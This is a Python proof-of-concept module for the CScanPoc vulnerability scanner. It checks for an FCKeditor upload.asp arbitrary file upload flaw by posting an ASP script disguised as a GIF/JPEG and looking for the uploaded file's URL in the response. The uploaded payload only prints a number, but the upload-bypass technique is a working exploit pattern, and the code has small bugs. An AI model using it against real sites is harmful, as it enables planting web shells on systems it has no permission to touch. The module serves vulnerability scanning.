# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    poc_id = '0d5368ab-b67f-4c8b-8921-be202855f9fc'
    name = 'FCKeditor upload.asp 任意文件上传'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD # 漏洞类型
    disclosure_date = 'Unkonwn'  # 漏洞公布时间
    desc = '''
        FCKeditor upload.asp 文件为黑名单过滤, 可绕过上传。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'FCKeditor'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本



class Poc(ABPoc):
    poc_id = '98b1a910-df81-4013-b090-4ac82fee5a68'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            path = self.target + '/editor/filemanager/upload/asp/upload.asp'
            payload = '-----------------------------20537215486483\r\n'
            payload += 'Content-Disposition: form-data; name="NewFile"; filename="css3.asp"\r\n'
            payload += 'Content-Type: image/jpeg\r\n\r\n'
            payload += 'GIF89a\r\n'
            payload += '<%response.write(999+111)%>\r\n\r\n\r\n'
            payload += '-----------------------------20537215486483--\r\n'
            payload_len = len(payload)
            head = "Content-Type: multipart/form-data; boundary=----20537215486483\r\n"
            head += "Connection: Close\r\n"
            head += "Content-Length: %d" % payload_len + '\r\n\r\n'

            code, head, body, ecode, redirct_url = hh.http(path, headers=head, payload=payload)
            if code == 200:
                re_shellurl = re.compile('OnUploadCompleted\(.+.asp\)')
                shellurl = re_shellurl.findall(body)
                if shellurl:
                    print 1
                    ellurl = re.findall('../(\w.+?)"', shellurl)
                    if len(ellurl) > 0:
                        #security_hole('vulnerable: %s' % util.urljoin(host, '../' + shellurl))
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
